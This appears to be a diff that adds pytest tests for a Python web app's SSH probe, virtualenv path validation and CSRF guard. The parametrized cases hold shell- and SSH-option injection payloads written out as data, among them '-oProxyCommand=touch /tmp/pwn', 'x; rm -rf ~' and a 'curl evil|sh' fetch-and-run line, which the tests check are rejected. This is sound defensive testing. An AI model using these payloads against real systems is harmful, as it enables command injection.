@@ -7,10 +7,15 @@ import sys
 from pathlib import Path
 from types import SimpleNamespace
 
+import pytest
+
 from routes.shell_routes import (
     _find_line_break,
     _running_in_container,
     _docker_row_status,
+    _ssh_base_argv,
+    _venv_activate_prefix,
+    _reject_cross_site,
     DOCKER_IN_CONTAINER_HINT,
 )
 
@@ -182,3 +187,124 @@ class TestDockerRowStatus:
         assert "remote" in lowered
         assert "socket" in lowered
         assert "host-root" in lowered or "host root" in lowered
+
+
+class TestSshBaseArgv:
+    """The /api/cookbook/packages remote probe must build an argv list (no
+    shell string) and validate host/port, so neither can break out into a
+    shell — either locally (ssh-option injection) or via create_subprocess."""
+
+    def test_basic_host_no_port(self):
+        argv = _ssh_base_argv("user@example.com", None)
+        assert argv == [
+            "ssh", "-o", "ConnectTimeout=6", "-o", "StrictHostKeyChecking=no",
+            "user@example.com",
+        ]
+
+    def test_default_port_22_omitted(self):
+        # "22" is the default — no -p flag, matching prior behaviour.
+        assert "-p" not in _ssh_base_argv("h", "22")
+        assert "-p" not in _ssh_base_argv("h", "")
+        assert "-p" not in _ssh_base_argv("h", None)
+
+    def test_custom_port_added_as_separate_argv(self):
+        argv = _ssh_base_argv("h", "2222")
+        assert argv[-3:] == ["-p", "2222", "h"]
+
+    def test_injection_port_rejected(self):
+        """A port like "22; id; hostname #" as a shell string would run
+        `id; hostname`; as a validated argv element it must raise."""
+        with pytest.raises(ValueError):
+            _ssh_base_argv("x@x", "22; id; hostname #")
+
+    @pytest.mark.parametrize("bad", ["0", "70000", "-1", "8a", "$(id)", "22 22"])
+    def test_non_numeric_or_out_of_range_port_rejected(self, bad):
+        with pytest.raises(ValueError):
+            _ssh_base_argv("h", bad)
+
+    def test_option_injecting_host_rejected(self):
+        """A host beginning with '-' would be parsed by ssh as a flag
+        (e.g. -oProxyCommand=… → local command execution); reject it."""
+        with pytest.raises(ValueError):
+            _ssh_base_argv("-oProxyCommand=touch /tmp/pwn", None)
+
+    @pytest.mark.parametrize("bad", ["", "   ", None])
+    def test_empty_host_rejected(self, bad):
+        with pytest.raises(ValueError):
+            _ssh_base_argv(bad, None)
+
+    def test_metachars_in_host_are_inert_as_argv(self):
+        """A host full of shell metacharacters is harmless once it's a single
+        argv element passed to exec (no shell parses it)."""
+        argv = _ssh_base_argv("x; rm -rf ~", None)
+        assert argv[-1] == "x; rm -rf ~"
+
+
+class TestVenvActivatePrefix:
+    """`venv` is interpolated unquoted into the remote shell (so `~` expands);
+    it must be charset-validated to block remote shell injection."""
+
+    def test_empty_returns_blank(self):
+        assert _venv_activate_prefix(None) == ""
+        assert _venv_activate_prefix("") == ""
+
+    def test_appends_bin_activate(self):
+        assert _venv_activate_prefix("~/venv") == ". ~/venv/bin/activate && "
+
+    def test_already_pointing_at_activate(self):
+        assert _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "
+
+    def test_trailing_slash_normalised(self):
+        assert _venv_activate_prefix("/opt/v/") == ". /opt/v/bin/activate && "
+
+    @pytest.mark.parametrize("bad", [
+        "/opt/v && curl evil|sh",
+        "$(id)",
+        "`id`",
+        "v;id",
+        "v\nid",
+        "v|id",
+    ])
+    def test_injection_payloads_rejected(self, bad):
+        with pytest.raises(ValueError):
+            _venv_activate_prefix(bad)
+
+
+class TestRejectCrossSite:
+    """Defense-in-depth CSRF guard: block browser cross-site navigations,
+    leave same-origin fetches and non-browser clients alone."""
+
+    @staticmethod
+    def _req(headers):
+        return SimpleNamespace(headers=headers)
+
+    def test_cross_site_rejected(self):
+        from fastapi import HTTPException
+        with pytest.raises(HTTPException) as exc:
+            _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
+        assert exc.value.status_code == 403
+
+    @pytest.mark.parametrize("site", ["same-origin", "same-site", "none"])
+    def test_same_origin_and_direct_nav_allowed(self, site):
+        assert _reject_cross_site(self._req({"sec-fetch-site": site})) is None
+
+    def test_missing_header_allowed(self):
+        # curl / the in-process tool loopback send no Sec-Fetch-Site.
+        assert _reject_cross_site(self._req({})) is None
+
+
+def test_list_packages_is_admin_and_csrf_gated():
+    """Source-pin the authz + CSRF guard and the no-shell SSH probe on
+    /api/cookbook/packages so a future refactor can't silently drop them
+    (mirrors the mcp_routes admin-gating test)."""
+    src = Path(__file__).resolve().parents[1] / "routes" / "shell_routes.py"
+    text = src.read_text()
+    assert "async def list_packages(request: Request" in text
+    body = text.split("async def list_packages(request: Request", 1)[1]
+    head = body.split("import importlib", 1)[0]
+    assert "_require_admin(request)" in head
+    assert "_reject_cross_site(request)" in head
+    # The remote probe must no longer shell out as a string.
+    probe = body.split('return {"packages"', 1)[0]
+    assert "create_subprocess_shell" not in probe
+    assert "create_subprocess_exec" in probe
